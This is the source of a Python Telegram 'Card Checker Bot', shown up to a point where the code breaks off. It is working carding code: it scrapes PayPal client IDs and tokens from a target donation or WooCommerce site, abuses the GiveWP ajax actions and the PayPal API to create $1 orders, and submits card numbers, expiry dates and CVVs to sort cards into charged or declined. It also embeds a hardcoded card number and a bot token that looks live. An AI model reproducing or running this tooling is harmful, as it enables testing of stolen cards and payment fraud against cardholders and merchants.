import telebot
import time
import threading
from telebot import types
import requests, random, json, string, re, base64
from telebot.types import LabeledPrice
from datetime import datetime, timedelta
import os
import html
import traceback
from user_agent import generate_user_agent
from requests_toolbelt.multipart.encoder import MultipartEncoder
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
import uuid
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# === استيراد UserAgent مع fallback ===
try:
    from fake_useragent import UserAgent
    uu = UserAgent()
    uu.random
    HAS_FAKE_UA = True
except:
    HAS_FAKE_UA = False
    class SimpleUA:
        def __init__(self):
            self.agents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
                'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            ]
        
        @property
        def random(self):
            return random.choice(self.agents)

# === الإيموجي المميز ===
PREMIUM_EMOJI_IDS = {
    "🚀": "5195033767969839232",
    "🤖": "6039619012051082706",
    "💎": "6039601162167000043",
    "⭐": "6034999602925542852",
    "✅": "6034891730526935918",
    "❌": "6039615816595414817",
    "📌": "6039389463228981149",
    "👥": "6046639187636003094",
    "👤": "6041709716231429926",
    "🦾": "6042051651462766312",
    "⚡": "6037229996622225123",
    "🌟": "5956369596528204273",
    "😳": "5900230031757547198",
    "😂": "6026036006178789152",
    "💲": "5929335569128623821",
    "🎺": "5929509352095354418",
    "📎": "5926906120877640711",
    "👁": "5976794472418121581",
    "💀": "5976323628038363401",
    "💰": "4983539296163070766",
    "🛑": "6039615816595414817",
    "🔥": "5424972470023104089",
    "🏦": "5332455502917949981",
    "⏱": "5382194935057372936",
    "💳": "5445353829304387411",
}

def premium_emoji(text):
    if not text:
        return text
    result = text
    sorted_emojis = sorted(PREMIUM_EMOJI_IDS.keys(), key=len, reverse=True)
    for emoji in sorted_emojis:
        doc_id = PREMIUM_EMOJI_IDS[emoji]
        result = result.replace(emoji, f'<tg-emoji emoji-id="{doc_id}">{emoji}</tg-emoji>')
    return result

# === بيانات البوت ===
token = '8407490230:AAEWWQvi_64s0BK5kGXn2XqU2DmYFqVx3lU'
bot = telebot.TeleBot(token, parse_mode="HTML")
admin = 6843321125
myid = ['6843321125']
admins = ['6843321125']
OWNER_ID = 6843321125

waiting_users = {}
reply_mode = {}
processing_status = {}

if not os.path.exists('blockusers.txt'):
    with open('blockusers.txt', 'w') as f:
        f.write('')

# === دالة إرسال ملف آمنة ===
def safe_send_document(chat_id, file_path, caption="", parse_mode="HTML", retries=3):
    """إرسال ملف بأمان مع التحقق من النوع"""
    for i in range(retries):
        try:
            # تحويل dict إلى string إذا لزم
            if isinstance(file_path, dict):
                if 'file_path' in file_path:
                    file_path = file_path['file_path']
                elif 'file_id' in file_path:
                    file_path = file_path['file_id']
                else:
                    print(f"❌ Cannot extract path from dict: {file_path}")
                    return None
            
            # تأكد إنه string
            file_path = str(file_path)
            
            # تحقق من وجود الملف
            if not os.path.exists(file_path):
                print(f"❌ File not found: {file_path}")
                return None
            
            # إرسال الملف
            with open(file_path, 'rb') as f:
                return bot.send_document(
                    chat_id=chat_id,
                    document=f,
                    caption=caption,
                    parse_mode=parse_mode
                )
                
        except Exception as e:
            if "429" in str(e):
                try:
                    wait_time = int(str(e).split("retry after ")[1].split(")")[0]) if "retry after" in str(e) else 30
                except:
                    wait_time = 30
                print(f"⏳ FloodWait (send): {wait_time}s")
                time.sleep(min(wait_time, 60))
            else:
                print(f"❌ Error sending document: {e}")
                print(traceback.format_exc())
                break
    return None

def safe_edit_message(chat_id, message_id, text, parse_mode="HTML", retries=3):
    for i in range(retries):
        try:
            return bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=text, parse_mode=parse_mode)
        except Exception as e:
            if "429" in str(e):
                try:
                    wait_time = int(str(e).split("retry after ")[1].split(")")[0]) if "retry after" in str(e) else 30
                except:
                    wait_time = 30
                print(f"⏳ FloodWait (edit): {wait_time}s")
                time.sleep(min(wait_time, 60))
            else:
                break
    return None

def safe_send_message(chat_id, text, parse_mode="HTML", retries=3, reply_markup=None):
    for i in range(retries):
        try:
            return bot.send_message(
                chat_id,
                text,
                parse_mode=parse_mode,
                reply_markup=reply_markup
            )
        except Exception as e:
            if "429" in str(e):
                try:
                    wait_time = int(str(e).split("retry after ")[1].split(")")[0]) if "retry after" in str(e) else 30
                except:
                    wait_time = 30
                print(f"⏳ FloodWait (msg): {wait_time}s")
                time.sleep(min(wait_time, 60))
            else:
                break
    return None

PAYPAL_RESPONSES = [
    'Payer cannot pay', 'INSUFFICIENT_FUNDS', 'ORDER_NOT_APPROVED',
    'TRANSACTION_REFUSED', 'PAYER_ACTION_REQUIRED', 'INSTRUMENT_DECLINED',
    'CARD_DECLINED', 'PAYMENT_DENIED', 'PAYER_CANNOT_PAY',
    'EXPIRED_CARD', 'INVALID_PAYMENT_METHOD', 'DO_NOT_HONOR',
    'ACCOUNT_CLOSED', 'LOST_OR_STOLEN', 'CVV2_FAILURE',
    'SUSPECTED_FRAUD', 'INVALID_ACCOUNT', 'REATTEMPT_NOT_PERMITTED',
    'ACCOUNT_BLOCKED_BY_ISSUER', 'PICKUP_CARD_SPECIAL_CONDITIONS',
    'GENERIC_DECLINE', 'COMPLIANCE_VIOLATION', 'TRANSACTION_NOT_PERMITTED',
    'INVALID_TRANSACTION', 'RESTRICTED_OR_INACTIVE_ACCOUNT',
    'SECURITY_VIOLATION', 'DECLINED_DUE_TO_UPDATED_ACCOUNT',
    'INVALID_OR_RESTRICTED_CARD', 'EXPIRED_CREDIT_CARD', 'CRYPTOGRAPHIC_FAILURE',
    'TRANSACTION_CANNOT_BE_COMPLETED', 'DECLINED_PLEASE_RETRY',
    'TX_ATTEMPTS_EXCEED_LIMIT', 'PAYER_ACCOUNT_LOCKED_OR_CLOSED',
    'DECLINED', 'CHARGE', 'UNPROCESSABLE_ENTITY', 'VALIDATION_ERROR',
    'INVALID_REQUEST', 'AUTHENTICATION_FAILURE', 'NOT_AUTHORIZED',
    'NOT_ENABLED_FOR_CARD_PROCESSING', 'CARD_TYPE_NOT_SUPPORTED',
    'MERCHANT_NOT_ENABLED', 'PAYEE_NOT_ENABLED_FOR_CARD_PROCESSING',
    'INVALID_CURRENCY', 'CURRENCY_NOT_SUPPORTED', 'AMOUNT_MISMATCH',
    'ITEM_TOTAL_MISMATCH', 'TAX_TOTAL_MISMATCH', 'SHIPPING_TOTAL_MISMATCH',
    'HANDLING_TOTAL_MISMATCH', 'INSURANCE_TOTAL_MISMATCH', 'SHIPPING_DISCOUNT_MISMATCH',
    'INVALID_PAYER_ID', 'INVALID_PAYEE_ID', 'INVALID_RESOURCE_ID',
    'INVALID_PARAMETER', 'INVALID_PARAMETER_SYNTAX', 'INVALID_STRING_LENGTH',
    'INVALID_STRING_FORMAT', 'MISSING_REQUIRED_PARAMETER', 'DUPLICATE_REQUEST_ID',
    'DUPLICATE_INVOICE_ID', 'MAX_NUMBER_OF_PAYMENT_ATTEMPTS_EXCEEDED',
    'PAYEE_ACCOUNT_RESTRICTED', 'PAYEE_ACCOUNT_INVALID', 'PAYEE_ACCOUNT_LOCKED_OR_CLOSED',
    'PAYEE_BLOCKED_TRANSACTION', 'PAYER_BLOCKED_TRANSACTION', 'PAYER_ACCOUNT_RESTRICTED',
    'PAYER_ACCOUNT_INVALID', 'UNSUPPORTED_INTENT', 'UNSUPPORTED_PAYMENT_INSTRUMENT',
    'UNSUPPORTED_SHIPPING_TYPE', 'SHIPPING_ADDRESS_INVALID', 'SHIPPING_OPTION_NOT_SUPPORTED',
    'MULTIPLE_SHIPPING_ADDRESS_NOT_SUPPORTED', 'MULTIPLE_SHIPPING_OPTION_SELECTED',
    'INVALID_PICKUP_ADDRESS', 'PICKUP_ADDRESS_INVALID', 'INVALID_SHIPPING_ADDRESS',
    'AUTHORIZATION_VOIDED', 'AUTHORIZATION_EXPIRED', 'AUTHORIZATION_DENIED',
    'AUTHORIZATION_CAPTURED', 'CAPTURE_FULLY_REFUNDED', 'CAPTURE_PARTIALLY_REFUNDED',
    'REFUND_NOT_PERMITTED', 'REFUND_DENIED', 'REFUND_FAILED',
    'TRANSACTION_ALREADY_REFUNDED', 'TRANSACTION_LIMIT_EXCEEDED',
    'BILLING_AGREEMENT_NOT_FOUND', 'BILLING_AGREEMENT_CANCELLED',
    'BILLING_AGREEMENT_EXPIRED', 'BILLING_AGREEMENT_FAILED',
    'INTERNAL_SERVER_ERROR', 'SERVICE_UNAVAILABLE', 'RESOURCE_NOT_FOUND',
    'METHOD_NOT_ALLOWED', 'NOT_ACCEPTABLE', 'UNSUPPORTED_MEDIA_TYPE',
    'RATE_LIMIT_REACHED', 'INSUFFICIENT_PERMISSIONS', 'INVALID_ACCESS_TOKEN',
    'EXPIRED_ACCESS_TOKEN', 'MALFORMED_REQUEST', 'UNKNOWN_ERROR',
]

DEAD_RESPONSES = [
    'invalid_client', 'Client Authentication failed', 'invalid_grant',
    'unsupported_grant_type', 'invalid_scope', 'Create Order Failed',
    'Invalid card format', 'No form fields', 'No au', 'No PayPal data',
    'Connection failed', 'Decode error', 'Invalid URL', 'Error:',
    'name', 'UserAgent', 'ImportError', 'Expecting value',
]

# === أمر البداية ===
@bot.message_handler(commands=["start"])
def start(message):
    with open("blockusers.txt", "r") as file:
        blocked = file.read().splitlines()
    if str(message.from_user.id) in blocked:
        safe_send_message(message.chat.id, premium_emoji('❌ The admin has blocked you due to your negative behavior.'))
        return 
    
    user_id = message.from_user.id
    userr = message.from_user.first_name
    username = message.from_user.username or "No Username"

    IU = premium_emoji(f'''⚡ 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 𝐂𝐚𝐫𝐝 𝐂𝐡𝐞𝐜𝐤𝐞𝐫 𝐁𝐨𝐭 🌟
- - - - - - - - - - - - - - - - - - - - - -
👤 𝐍𝐚𝐦𝐞: {userr}
📌 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞: @{username}
🆔 𝐈𝐃: <code>{user_id}</code>
- - - - - - - - - - - - - - - - - - - - - -
💳 PayPal Gateway >> /paypal 
📁 Mass Extract >> /mass
📩 Send Feedback >> Button Below
- - - - - - - - - - - - - - - - - - - - - -
🤖 𝐁𝐨𝐭 𝐁𝐲: @FAWZY30
💎 𝐃𝐞𝐯 𝐁𝐲: Wafa''')
    
    FRA = types.InlineKeyboardMarkup(row_width=2)
    Yes22 = types.InlineKeyboardButton('📩 Submit Feedback to Owner', callback_data='yrr')
    FRA.add(Yes22)
    
    safe_send_message(message.chat.id, IU, reply_markup=FRA)

@bot.callback_query_handler(func=lambda call: call.data == 'yrr')
def feedback(call):
    user_id = call.from_user.id
    userr = call.from_user.first_name
    Atty = types.InlineKeyboardMarkup(row_width=1)
    back = types.InlineKeyboardButton("🔙 Back", callback_data="start")
    Atty.add(back)
    YTT = premium_emoji(f'''📩 Welcome {userr} Send your message and the admin will respond.''')
    try:
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=YTT,
            parse_mode='HTML',
            reply_markup=Atty
        )
    except Exception as e:
        print(f"Feedback error: {e}")
    waiting_users[user_id] = True

@bot.message_handler(func=lambda m: m.from_user.id in waiting_users)
def get_user_msg(message):
    user_id = message.from_user.id
    name = message.from_user.first_name
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("📩 Reply", callback_data=f"reply_{user_id}"))
    safe_send_message(OWNER_ID, premium_emoji(f"📩 New Message\n\n👤 From: {name}\n🆔 ID: {user_id}\n💬 Message: {message.text}"), reply_markup=kb)
    kb2 = types.InlineKeyboardMarkup()
    kb2.add(types.InlineKeyboardButton("📩 Send another message", callback_data="yrr"))
    safe_send_message(user_id, premium_emoji("✅ Your message has been sent."), reply_markup=kb2)
    waiting_users.pop(user_id)

@bot.callback_query_handler(func=lambda call: call.data.startswith("reply_"))
def start_reply(call):
    user_id = int(call.data.split("_")[1])
    reply_mode[call.from_user.id] = user_id
    safe_send_message(call.from_user.id, premium_emoji("📩 Write your reply now:"))

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.from_user.id in reply_mode)
def send_reply(message):
    user_id = reply_mode[message.from_user.id]
    safe_send_message(user_id, premium_emoji(f"📩 Admin response:\n\n{message.text}"))
    safe_send_message(OWNER_ID, premium_emoji("✅ Reply sent."))
    reply_mode.pop(message.from_user.id)

@bot.callback_query_handler(func=lambda call: call.data == "start")
def back_to_start(call):
    user_id = call.from_user.id
    userr = call.from_user.first_name
    username = call.from_user.username or "No Username"
    IU = premium_emoji(f'''⚡ 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 𝐂𝐚𝐫𝐝 𝐂𝐡𝐞𝐜𝐤𝐞𝐫 𝐁𝐨𝐭 🌟\n- - - - - - - - - - - - - - - - - - - - - -\n👤 𝐍𝐚𝐦𝐞: {userr}\n📌 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞: @{username}\n🆔 𝐈𝐃: <code>{user_id}</code>''')
    FRA = types.InlineKeyboardMarkup(row_width=2)
    Yes22 = types.InlineKeyboardButton('📩 Submit Feedback to Owner', callback_data='yrr')
    FRA.add(Yes22)
    try:
        bot.edit_message_text(IU, call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=FRA)
    except Exception as e:
        print(f"Back error: {e}")

# ============ كلاس PayPalLinkTester ============
class PayPalLinkTester:
    def __init__(self, target_url):
        self.first_name = ["James", "John", "Robert", "Michael", "William"]
        self.last_name = ["Smith", "Johnson", "Williams", "Brown", "Jones"]
        self.donation = "1.00"
        self.r = requests.Session()
        self.r.verify = False
        if HAS_FAKE_UA:
            self.uu = UserAgent()
        else:
            self.uu = SimpleUA()
        self.client_id = None
        self.access_token = None
        self.client_token = None
        self.form_data = {}
        self.ajax_url = None
        self.cookies = {}
        self.target_url = target_url
        self.url = urlparse(target_url).netloc
        self.inurl = urlparse(target_url).path
        if urlparse(target_url).query:
            self.inurl += f"?{urlparse(target_url).query}"
        self.email = f"{random.choice(self.first_name)}{random.randint(100,999)}@gmail.com"

    def Charge(self, ccx):
        try:
            self._init_and_extract()
            self._try_all_token_methods()
            
            parts = ccx.strip().split("|")
            if len(parts) < 4:
                return "Invalid card format"
            n, mm, yy, cvc = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
            if "20" in yy:
                yy = yy.split("20")[1]
            
            try:
                exp_year = int(f"20{yy}")
                exp_month = int(mm)
                now = datetime.now()
                if exp_year < now.year or (exp_year == now.year and exp_month < now.month):
                    return "EXPIRED_CARD"
            except:
                pass
            
            expiry = f"20{yy}-{mm}"
            order_id = self._create_order()
            
            if not order_id:
                return "Create Order Failed"
            
            auth_tokens = []
            if self.client_token:
                auth_tokens.append(self.client_token)
            if self.access_token:
                auth_tokens.append(self.access_token)
            if self.client_id:
                auth_tokens.append(self.client_id)
            
            confirm_json = {}
            for auth_token in auth_tokens:
                he4 = {
                    'authorization': f'Bearer {auth_token}',
                    'paypal-client-metadata-id': self.client_id or '',
                    'user-agent': self.uu.random,
                    'paypal-request-id': str(uuid.uuid4()),
                }
                da3 = {
                    'payment_source': {
                        'card': {
                            'number': n,
                            'expiry': expiry,
                            'security_code': cvc,
                            'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}},
                        }
                    },
                    'application_context': {'vault': False},
                }
                try:
                    confirm_res = self.r.post(
                        f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source',
                        headers=he4,
                        json=da3,
                        timeout=15
                    )
                    if confirm_res.status_code == 200:
                        try:
                            confirm_json = confirm_res.json()
                        except:
                            confirm_json = {}
                        break
                except:
                    continue
            
            if isinstance(confirm_json, dict):
                confirm_str = str(confirm_json).upper()
                if 'INSUFFICIENT_FUNDS' in confirm_str:
                    return "INSUFFICIENT_FUNDS"
                if 'RESTRICTED_OR_INACTIVE_ACCOUNT' in confirm_str:
                    return "RESTRICTED_OR_INACTIVE_ACCOUNT"
                if 'PAYEE_BLOCKED_TRANSACTION' in confirm_str:
                    return "PAYEE_BLOCKED_TRANSACTION"
                if 'SUSPECTED_FRAUD' in confirm_str:
                    return "SUSPECTED_FRAUD"
                if 'EXPIRED_CARD' in confirm_str:
                    return "EXPIRED_CARD"
                if 'ORDER_NOT_APPROVED' in confirm_str:
                    return "Payer cannot pay for this transaction."
            
            approve_res = self._approve_order(order_id)
            text = approve_res.text if approve_res else ''
            
            return self._clean_response(text)
        except Exception as e:
            return f"Error: {e}"

    def _init_and_extract(self):
        try:
            headers = {'user-agent': self.uu.random, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'accept-language': 'en-US,en;q=0.9'}
            response = self.r.get(f'https://{self.url}{self.inurl}', headers=headers, timeout=15)
            self.cookies = dict(response.cookies)
            html = response.text
            self._extract_client_id(html)
            self._extract_form_data(html)
            self._extract_ajax_url(html)
            self._extract_all_tokens(html)
        except:
            pass

    def _extract_client_id(self, html):
        patterns = [
            r'client-id=["\']([^"\']+)["\']',
            r'client_id["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'data-client-id=["\']([^"\']+)["\']',
            r'clientId["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{20,})["\']',
            r'paypal_client_id["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'PAYPAL_CLIENT_ID["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'"clientId"\s*:\s*"([^"]+)"',
            r'client_id\s*=\s*["\']([^"\']+)["\']',
            r'merchant-id=["\']([^"\']+)["\']',
            r'data-merchant-id=["\']([^"\']+)["\']',
            r'"merchant_id"\s*:\s*"([^"]+)"',
            r'data-paypal-client-id=["\']([^"\']+)["\']',
            r'paypal-client-id=["\']([^"\']+)["\']',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                self.client_id = match.group(1)
                return
        
        script_matches = re.findall(r'<script[^>]*>(.*?)</script>', html, re.DOTALL)
        for script in script_matches:
            for pattern in patterns:
                match = re.search(pattern, script, re.IGNORECASE)
                if match:
                    self.client_id = match.group(1)
                    return
        
        long_strings = re.findall(r'["\']([A-Za-z0-9_-]{80,})["\']', html)
        for string in long_strings:
            if string.startswith(('A', 'B', 'E')):
                self.client_id = string
                return

    def _extract_form_data(self, html):
        inputs = re.findall(r'<input[^>]*type="hidden"[^>]*name="([^"]+)"[^>]*value="([^"]*)"', html)
        for name, value in inputs:
            self.form_data[name] = value
        
        data_attrs = re.findall(r'data-([\w-]+)="([^"]+)"', html)
        for attr_name, attr_value in data_attrs:
            if any(k in attr_name.lower() for k in ['give', 'paypal', 'form', 'client', 'merchant', 'nonce', 'hash', 'token', 'order']):
                self.form_data[attr_name] = attr_value

    def _extract_ajax_url(self, html):
        if 'admin-ajax.php' in html:
            self.ajax_url = f'https://{self.url}/wp-admin/admin-ajax.php'
        elif 'wc-ajax' in html:
            self.ajax_url = f'https://{self.url}/?wc-ajax=checkout'

    def _extract_all_tokens(self, html):
        patterns = [
            r'data-client-token=["\']([^"\']+)["\']',
            r'"data-client-token"\s*:\s*"([^"]+)"',
            r'client-token=["\']([^"\']+)["\']',
            r'client_token=["\']([^"\']+)["\']',
            r'clientToken=["\']([^"\']+)["\']',
            r'"clientToken"\s*:\s*"([^"]+)"',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                enc = match.group(1)
                try:
                    padded = enc + '=' * (-len(enc) % 4)
                    decoded = base64.b64decode(padded).decode('utf-8', errors='ignore')
                    token_match = re.search(r'"accessToken":"([^"]+)"', decoded)
                    if token_match:
                        self.access_token = token_match.group(1)
                        return
                except:
                    pass
                self.client_token = enc
                return
        
        direct_patterns = [
            r'accessToken["\']?\s*:\s*["\']([^"\']+)["\']',
            r'"accessToken"\s*:\s*"([^"]+)"',
            r'access_token["\']?\s*:\s*["\']([^"\']+)["\']',
            r'"access_token"\s*:\s*"([^"]+)"',
            r'accessToken=([^&\s"\']+)',
        ]
        
        for pattern in direct_patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                self.access_token = match.group(1)
                return

    def _try_all_token_methods(self):
        if self.access_token:
            return
        
        if self.client_id:
            token = self._get_oauth_token()
            if token:
                self.access_token = token
                return
        
        if self.ajax_url:
            token = self._get_client_token_from_site()
            if token:
                self.access_token = token
                return

    def _get_oauth_token(self):
        try:
            auth_header = base64.b64encode(f"{self.client_id}:".encode()).decode()
            headers = {
                'authorization': f'Basic {auth_header}',
                'content-type': 'application/x-www-form-urlencoded',
                'user-agent': self.uu.random,
            }
            response = self.r.post(
                'https://api-m.paypal.com/v1/oauth2/token',
                headers=headers,
                data={'grant_type': 'client_credentials'},
                timeout=15
            )
            if response.status_code == 200:
                return response.json().get('access_token')
        except:
            pass
        
        try:
            response = self.r.post(
                'https://api-m.paypal.com/v1/oauth2/token',
                auth=(self.client_id, ''),
                data={'grant_type': 'client_credentials'},
                headers={'user-agent': self.uu.random},
                timeout=15
            )
            if response.status_code == 200:
                return response.json().get('access_token')
        except:
            pass
        
        return None

    def _get_client_token_from_site(self):
        actions = [
            'give_paypal_commerce_get_client_token',
            'get_client_token',
            'paypal_get_client_token',
            'give_paypal_get_client_token',
            'ppcp_get_client_token',
            'wc_ppcp_get_client_token',
        ]
        
        for action in actions:
            try:
                data = {'action': action, 'form-id': self.form_data.get('give-form-id', '')}
                headers = {
                    'user-agent': self.uu.random,
                    'x-requested-with': 'XMLHttpRequest',
                    'origin': f'https://{self.url}',
                    'referer': f'https://{self.url}{self.inurl}',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                }
                response = self.r.post(self.ajax_url, data=data, headers=headers, cookies=self.cookies, timeout=10)
                if response.status_code == 200 and response.text:
                    json_data = response.json()
                    token = None
                    if 'data' in json_data:
                        if isinstance(json_data['data'], dict):
                            token = json_data['data'].get('client_token') or json_data['data'].get('token') or json_data['data'].get('access_token')
                        elif isinstance(json_data['data'], str):
                            token = json_data['data']
                    elif 'client_token' in json_data:
                        token = json_data['client_token']
                    elif 'token' in json_data:
                        token = json_data['token']
                    elif 'access_token' in json_data:
                        token = json_data['access_token']
                    
                    if token:
                        if '.' not in token:
                            try:
                                padded = token + '=' * (-len(token) % 4)
                                decoded = base64.b64decode(padded).decode('utf-8', errors='ignore')
                                token_match = re.search(r'"accessToken":"([^"]+)"', decoded)
                                if token_match:
                                    return token_match.group(1)
                            except:
                                pass
                        return token
            except:
                continue
        
        return None

    def _clean_response(self, text):
        if not text:
            return "DECLINED"
        
        text_upper = text.upper()
        text_lower = text.lower()
        
        if '<!DOCTYPE' in text_upper or '<html' in text_upper:
            return "DECLINED"
        
        if 'true' in text_lower or 'charge 1' in text_lower or 'charge $' in text_lower or 'charged' in text_lower or 'completed' in text_lower or 'approved' in text_lower or 'success' in text_lower:
            if 'error' not in text_lower and 'expecting' not in text_lower and 'invalid' not in text_lower:
                return "CHARGE 1.0"
        
        if 'insufficient' in text_lower:
            return "INSUFFICIENT_FUNDS"
        
        if 'order_not_approved' in text_lower:
            return "Payer cannot pay for this transaction."
        
        if 'expired_card' in text_lower or 'expired_credit_card' in text_lower:
            return "EXPIRED_CARD"
        elif 'payee_blocked_transaction' in text_lower:
            return "PAYEE_BLOCKED_TRANSACTION"
        elif 'suspected_fraud' in text_lower:
            return "SUSPECTED_FRAUD"
        elif 'restricted_or_inactive_account' in text_lower:
            return "RESTRICTED_OR_INACTIVE_ACCOUNT"
        elif 'declined' in text_lower or 'error' in text_lower or 'expecting' in text_lower or 'invalid' in text_lower or 'failed' in text_lower:
            return "DECLINED"
        
        return text[:80]

    def _create_order(self):
        if self.ajax_url and 'admin-ajax' in self.ajax_url:
            order_id = self._create_order_givewp()
            if order_id:
                return order_id
        
        if self.access_token:
            order_id = self._create_order_direct()
            if order_id:
                return order_id
        
        if self.client_token:
            order_id = self._create_order_with_client_token()
            if order_id:
                return order_id
        
        return None

    def _create_order_givewp(self):
        if not self.ajax_url:
            return None
        form_data = self.form_data.copy()
        form_data.update({
            'give-amount': self.donation,
            'payment-mode': 'paypal-commerce',
            'give_first': random.choice(self.first_name),
            'give_last': random.choice(self.last_name),
            'give_email': self.email,
            'give-gateway': 'paypal-commerce',
        })
        headers = {
            'user-agent': self.uu.random,
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'x-requested-with': 'XMLHttpRequest',
            'origin': f'https://{self.url}',
            'referer': f'https://{self.url}{self.inurl}',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        }
        actions = ['give_paypal_commerce_create_order', 'give_create_order', 'create_order']
        for action in actions:
            params = {'action': action}
            try:
                response = self.r.post(self.ajax_url, params=params, headers=headers, data=form_data, cookies=self.cookies, timeout=15)
                if response.status_code == 200 and response.text:
                    try:
                        json_data = response.json()
                        if 'data' in json_data:
                            if isinstance(json_data['data'], dict) and 'id' in json_data['data']:
                                return json_data['data']['id']
                            elif isinstance(json_data['data'], str):
                                return json_data['data']
                        if 'id' in json_data:
                            return json_data['id']
                        if 'order_id' in json_data:
                            return json_data['order_id']
                        if 'orderID' in json_data:
                            return json_data['orderID']
                    except:
                        pass
            except:
                continue
        return None

    def _create_order_direct(self):
        if not self.access_token:
            return None
        try:
            headers = {
                'authorization': f'Bearer {self.access_token}',
                'content-type': 'application/json',
                'user-agent': self.uu.random,
                'accept': 'application/json',
                'paypal-request-id': str(uuid.uuid4()),
            }
            data = {
                'intent': 'CAPTURE',
                'purchase_units': [{
                    'amount': {'currency_code': 'USD', 'value': self.donation}
                }],
                'application_context': {
                    'shipping_preference': 'NO_SHIPPING',
                    'user_action': 'PAY_NOW',
                }
            }
            response = self.r.post('https://api-m.paypal.com/v2/checkout/orders', headers=headers, json=data, timeout=15)
            if response.status_code in [200, 201]:
                response_data = response.json()
                if 'id' in response_data:
                    return response_data['id']
            return None
        except:
            return None

    def _create_order_with_client_token(self):
        if not self.client_token:
            return None
        try:
            headers = {
                'authorization': f'Bearer {self.client_token}',
                'content-type': 'application/json',
                'user-agent': self.uu.random,
                'accept': 'application/json',
            }
            data = {
                'intent': 'CAPTURE',
                'purchase_units': [{
                    'amount': {'currency_code': 'USD', 'value': self.donation}
                }]
            }
            response = self.r.post('https://api-m.paypal.com/v2/checkout/orders', headers=headers, json=data, timeout=15)
            if response.status_code in [200, 201]:
                response_data = response.json()
                if 'id' in response_data:
                    return response_data['id']
            return None
        except:
            return None

    def _approve_order(self, order_id):
        if self.ajax_url and 'admin-ajax' in self.ajax_url:
            result = self._approve_order_givewp(order_id)
            if result:
                return result
        
        if self.access_token:
            try:
                headers = {
                    'authorization': f'Bearer {self.access_token}',
                    'content-type': 'application/json',
                    'user-agent': self.uu.random,
                }
                response = self.r.post(
                    f'https://api-m.paypal.com/v2/checkout/orders/{order_id}/capture',
                    headers=headers,
                    timeout=15
                )
                return response
            except:
                pass
        
        return None

    def _approve_order_givewp(self, order_id):
        if not self.ajax_url:
            return None
        form_data = self.form_data.copy()
        form_data.update({
            'give-amount': self.donation,
            'payment-mode': 'paypal-commerce',
            'give_first': random.choice(self.first_name),
            'give_last': random.choice(self.last_name),
            'give_email': self.email,
            'give-gateway': 'paypal-commerce',
        })
        headers = {
            'user-agent': self.uu.random,
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'x-requested-with': 'XMLHttpRequest',
            'origin': f'https://{self.url}',
            'referer': f'https://{self.url}{self.inurl}',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        }
        actions = ['give_paypal_commerce_approve_order', 'give_approve_order', 'approve_order']
        for action in actions:
            params = {'action': action, 'order': order_id}
            try:
                response = self.r.post(self.ajax_url, params=params, headers=headers, data=form_data, cookies=self.cookies, timeout=15)
                if response.status_code == 200:
                    return response
            except:
                continue
        return None

# ============ أمر سحب PayPal ============
@bot.message_handler(func=lambda m: m.text.lower().startswith('/paypal'))
def ali_al2(massege):
    with open("blockusers.txt", "r") as file:
        blocked = file.read().splitlines()
    if str(massege.from_user.id) in blocked:
        safe_send_message(massege.chat.id, premium_emoji('❌ The admin has blocked you.'))
        return

    ko = safe_send_message(massege.chat.id, premium_emoji("⏳ - The gate is being withdrawn ..."))
    if not ko:
        return
    time.sleep(1)
    
    try:
        parts = massege.text.split(maxsplit=1)
        if len(parts) != 2:
            safe_edit_message(massege.chat.id, ko.message_id, premium_emoji('''💡 - Please send the link like this:\n\n<code>/paypal https://xxxxxxx.xxx/xxxx</code>'''))
            return

        link = parts[1].strip()

        if not link.startswith(("http://", "https://")):
            safe_edit_message(massege.chat.id, ko.message_id, premium_emoji("❌ Invalid link format"))
            return

        r = requests.get(link, headers={"User-Agent": "Mozilla/5.0"}, timeout=15)
        if r.status_code != 200:
            safe_edit_message(massege.chat.id, ko.message_id, premium_emoji(f"❌ Site returned status: {r.status_code}"))
            return

        time.sleep(1)
        safe_edit_message(massege.chat.id, ko.message_id, premium_emoji("✅ Gate found"))

    except:
        pass

    try:
        paypal = PayPalLinkTester(target_url=link)
        result = paypal.Charge('4059986126444431|11|30|947')
        
        is_live = False
        for pr in PAYPAL_RESPONSES:
